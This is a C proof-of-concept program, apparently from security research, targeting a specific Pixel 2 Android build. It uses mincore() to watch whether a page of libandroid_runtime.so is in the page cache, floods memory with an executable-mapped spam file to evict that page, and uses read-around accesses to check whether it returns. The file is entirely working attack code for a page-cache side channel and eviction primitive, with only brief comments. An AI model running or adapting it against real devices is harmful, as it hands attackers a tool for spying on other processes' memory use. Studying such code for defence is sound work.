#define _GNU_SOURCE
#include <pthread.h>
#include <sched.h>
#include <err.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/prctl.h>
#include <signal.h>

#define RAM_SIZE (3744240UL*1024UL)
#define SPAM_SIZE (RAM_SIZE * 2)

// for Pixel 2, build google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys
#define VICTIM_FILE "/system/lib64/libandroid_runtime.so"
#define VICTIM_SIZE   0x21cef0
#define VICTIM_OFFSET 0x157000

bool check_in_core(void *ptr) {
  unsigned char c;
  if (mincore(ptr, 0x1000, &c)) err(1, "mincore");
  return c & 1;
}

unsigned long get_us() {
  struct timeval tv;
  if (gettimeofday(&tv, NULL))
    err(1, "gettimeofday");
  return ((unsigned long)tv.tv_sec)*1000000UL + (unsigned long)tv.tv_usec;
}

int main(void) {
  setbuf(stdout, NULL);

  int fd = open(VICTIM_FILE, O_RDONLY);
  if (fd == -1) err(1, "open");
  char *victim_map = mmap(NULL, VICTIM_SIZE, PROT_READ, MAP_SHARED, fd, 0);
  if (victim_map == MAP_FAILED) err(1, "mmap");
  if (madvise(victim_map, VICTIM_SIZE, MADV_RANDOM)) err(1, "madv random");
  void *victim_page = victim_map + VICTIM_OFFSET;
  printf("in core initially: %d\n", (int)check_in_core(victim_page));

  int spam_fd = open("spam_file", O_RDWR|O_CREAT|O_TRUNC, 0666);
  if (fallocate(spam_fd, 0, 0, SPAM_SIZE)) err(1, "fallocate");

  // https://arxiv.org/pdf/1710.00551.pdf ("Another Flip in the Wall of
  // Rowhammer Defenses"), section VIII-B says:
  // "A fundamental observation we made is that the replacement algorithm of the
  //  Linux page cache prioritizes eviction of nonexecutable pages over
  //  executable pages."
  // In shrink_active_list() and page_check_references() in mm/vmscan.c, you can
  // see that file-backed executable pages get special handling.
  char *spam_map = mmap(NULL, SPAM_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, spam_fd, 0);
  if (spam_map == MAP_FAILED) err(1, "mmap spam");

restart:
  printf("starting\n");
  unsigned long ts = get_us();
  while (1) {
    for (unsigned long off = 0; off < SPAM_SIZE; off += 0x1000UL) {

      unsigned long cts = get_us();
      if (cts > ts + 300000) {
        if (!check_in_core(victim_page)) goto read_around;
        ts = cts;
      }

      *(volatile unsigned long *)(spam_map + off);
    }
    bool ic = check_in_core(victim_page);
    printf("in core (spamming): %d\n", (int)ic);
    if (!ic) break;
  }
read_around:
  printf("starting read-around\n");
  for (unsigned long off = 0; off < VICTIM_SIZE; off += 0x1000) {
    if (off == VICTIM_OFFSET) continue;
    //printf("RA at 0x%lx\n", off);
    bool ic = check_in_core(victim_page);
    if (ic) {
      printf("!!! back in core\n");
      goto restart;
    }
    *(volatile char *)(victim_map + off);
  }
  printf("stopping\n");

  return 0;
}